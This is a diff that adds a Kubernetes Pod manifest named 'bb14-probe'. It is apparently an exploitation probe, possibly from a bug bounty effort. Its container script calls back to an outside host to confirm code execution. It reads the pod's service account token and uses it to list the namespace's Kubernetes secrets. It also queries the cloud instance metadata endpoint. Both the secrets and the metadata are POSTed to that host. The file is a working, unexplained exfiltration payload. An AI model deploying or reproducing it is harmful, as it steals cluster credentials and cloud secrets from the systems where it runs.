@@ -1,0 +1,27 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: bb14-probe
+spec:
+  containers:
+  - name: probe
+    image: curlimages/curl:latest
+    command:
+    - sh
+    - -c
+    - |
+      # Callback to confirm execution
+      curl -s "https://www.masonhck.tech/cb.php?src=pod-rce-$(hostname)"
+      # Dump service account token
+      TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "no-token")
+      NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "no-ns")
+      curl -s "https://www.masonhck.tech/cb.php?src=sa-ns-${NAMESPACE}"
+      # List K8s secrets in namespace
+      curl -sk "https://kubernetes.default.svc/api/v1/namespaces/${NAMESPACE}/secrets" \
+        -H "Authorization: Bearer ${TOKEN}" | head -c 2000 | \
+        curl -s -X POST "https://www.masonhck.tech/cb.php?src=k8s-secrets" -d @-
+      # Check IMDS from inside pod
+      curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" | \
+        curl -s -X POST "https://www.masonhck.tech/cb.php?src=imds-from-pod" -d @-
+      sleep 3600
+  restartPolicy: Never
